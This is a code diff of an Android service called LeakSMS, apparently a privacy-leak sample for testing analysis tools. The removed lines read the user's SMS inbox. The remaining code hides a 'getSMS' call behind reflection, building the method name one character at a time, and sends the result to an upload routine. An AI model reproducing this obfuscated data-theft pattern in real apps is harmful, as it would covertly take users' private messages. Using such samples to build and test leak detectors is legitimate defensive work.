@@ -29,13 +29,10 @@ public class LeakSMS extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
+        String victimSMS="";
         try {
-            LeakSMS L=new LeakSMS();
             Method methodGet=LeakSMS.class.getMethod(getString());
-            Method methodUpload=LeakSMS.class.getMethod("uploadSMS", String.class);
-            String victimSMS=(String)methodGet.invoke(L);
-            uploadSMS(victimSMS);
+            victimSMS=(String)methodGet.invoke(new LeakSMS());
         } catch (NoSuchMethodException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
@@ -43,24 +40,17 @@ public class LeakSMS extends Service {
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         }
+        uploadSMS(victimSMS);
         return  super.onStartCommand(intent, flags, startId);
     }
 
     public String getSMS()
     {
-        String str = "";
-        Uri inboxURI = Uri.parse("content://sms/inbox");
-        Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
-        if (cur.moveToFirst()) {
-            str = cur.getString(cur.getColumnIndexOrThrow("body"));
-        }
-        str=str.replace(" ","_");
-        return str;
+        return "Hello-world";
     }
 
     public String getString(){
-        String str="";
-        str=str+"g";
+        String str="g";
         str=str+"e";
         str=str+"t";
         str=str+"S";
@@ -81,7 +71,6 @@ public class LeakSMS extends Service {
                 }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-
 
             }
         });
